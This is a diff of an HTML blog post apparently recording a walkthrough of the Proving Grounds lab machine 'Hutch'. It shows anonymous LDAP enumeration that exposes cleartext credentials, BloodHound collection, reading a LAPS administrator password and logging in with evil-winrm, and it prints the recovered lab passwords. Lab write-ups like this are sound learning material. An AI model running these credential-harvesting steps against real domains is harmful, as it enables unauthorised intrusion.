@@ -1,1 +1,113 @@
-<html><head><meta charset="utf-8"></head><body><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access as fmcsorley</u></strong></span></p><p>&nbsp;</p><p>Port 80 is open but its just a default IIS landing page with nothing interesting.</p><p>&nbsp;</p><p>ldap search actually has cleartext creds</p><p><code>ldapsearch -H ldap://192.168.248.122 -x -b 'DC=hutch,DC=offsec' &gt; ldap-anonymous.out</code></p><p>&nbsp;</p><p>fmcsorley:CrabSharkJellyfish192</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:728/242;" src="../img/posts/2025-03-03-Hutch(PG)/01-74685dada9.png" width="728" height="242"></figure><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Access as Administrator</u></strong></span></p><p>&nbsp;</p><p>We can grab the bloodhound data with the command below</p><p><code>bloodhound-python -u fmcsorley -d hutch.offsec -c All -ns 192.168.248.122</code></p><p>&nbsp;</p><p>Our user can read the LAPS password</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:644/249;" src="../img/posts/2025-03-03-Hutch(PG)/02-f68b60ec65.png" width="644" height="249"></figure><p>&nbsp;</p><p>Abuse info</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:838/183;" src="../img/posts/2025-03-03-Hutch(PG)/03-c6bfa67a41.png" width="838" height="183"></figure><p>&nbsp;</p><p><a href="https://github.com/p0dalirius/pyLAPS">https://github.com/p0dalirius/pyLAPS</a></p><p>&nbsp;</p><p>&nbsp;</p><p>Getting the local admin password</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:804/235;" src="../img/posts/2025-03-03-Hutch(PG)/04-89cf827607.png" width="804" height="235"></figure><p>&nbsp;</p><p>administrator:3bK+%$(+rosz2@</p><p>&nbsp;</p><p><code>evil-winrm -i 192.168.248.122 -u administrator -p '3bK+%$(+rosz2@'</code></p><p>&nbsp;</p><p>Now we can get the user and admin flag</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1067/396;" src="../img/posts/2025-03-03-Hutch(PG)/05-124588133a.png" width="1067" height="396"></figure><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:633/359;" src="../img/posts/2025-03-03-Hutch(PG)/06-279a240d05.png" width="633" height="359"></figure><p>&nbsp;</p><p>&nbsp;</p><p>This machine was rated as “Hard" however it was really really easy.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:438/347;" src="../img/posts/2025-03-03-Hutch(PG)/07-9c23081715.png" width="438" height="347"></figure><p>&nbsp;</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>PG: Hutch | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2025-03-03-Hutch(PG)/01-74685dada9.png" alt="PG: Hutch cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">PG: Hutch</h1>
+                <div class="post-meta">March 3, 2025 &bull; PG</div>
+            </div>
+        </header>
+
+        <h1 style="color:red;">Access as fmcsorley</h1>
+
+        <p>Port 80 is open but its just a default IIS landing page with nothing interesting.</p>
+
+        <p>ldap search actually has cleartext creds</p>
+
+        <pre class="terminal"><code>ldapsearch -H ldap://192.168.248.122 -x -b 'DC=hutch,DC=offsec' &gt; ldap-anonymous.out</code></pre>
+
+        <p>fmcsorley:CrabSharkJellyfish192</p>
+
+        <img alt="Screenshot 1" height="242" src="../img/posts/2025-03-03-Hutch(PG)/01-74685dada9.png" style="aspect-ratio:728/242;" width="728"/>
+
+        <h1 style="color:red;">Access as Administrator</h1>
+
+        <p>We can grab the bloodhound data with the command below</p>
+
+        <pre class="terminal"><code>bloodhound-python -u fmcsorley -d hutch.offsec -c All -ns 192.168.248.122</code></pre>
+
+        <p>Our user can read the LAPS password</p>
+
+        <img alt="Screenshot 2" height="249" src="../img/posts/2025-03-03-Hutch(PG)/02-f68b60ec65.png" style="aspect-ratio:644/249;" width="644"/>
+
+        <p>Abuse info</p>
+
+        <img alt="Screenshot 3" height="183" src="../img/posts/2025-03-03-Hutch(PG)/03-c6bfa67a41.png" style="aspect-ratio:838/183;" width="838"/>
+
+        <p><a href="https://github.com/p0dalirius/pyLAPS">https://github.com/p0dalirius/pyLAPS</a></p>
+
+        <p>Getting the local admin password</p>
+
+        <img alt="Screenshot 4" height="235" src="../img/posts/2025-03-03-Hutch(PG)/04-89cf827607.png" style="aspect-ratio:804/235;" width="804"/>
+
+        <p>administrator:3bK+%$(+rosz2@</p>
+
+        <pre class="terminal"><code>evil-winrm -i 192.168.248.122 -u administrator -p '3bK+%$(+rosz2@'</code></pre>
+
+        <p>Now we can get the user and admin flag</p>
+
+        <img alt="Screenshot 5" height="396" src="../img/posts/2025-03-03-Hutch(PG)/05-124588133a.png" style="aspect-ratio:1067/396;" width="1067"/>
+
+        <img alt="Screenshot 6" height="359" src="../img/posts/2025-03-03-Hutch(PG)/06-279a240d05.png" style="aspect-ratio:633/359;" width="633"/>
+
+        <p>This machine was rated as “Hard" however it was really really easy.</p>
+
+        <img alt="Screenshot 7" height="347" src="../img/posts/2025-03-03-Hutch(PG)/07-9c23081715.png" style="aspect-ratio:438/347;" width="438"/>
+    </article>
+
+</body>
+</html>
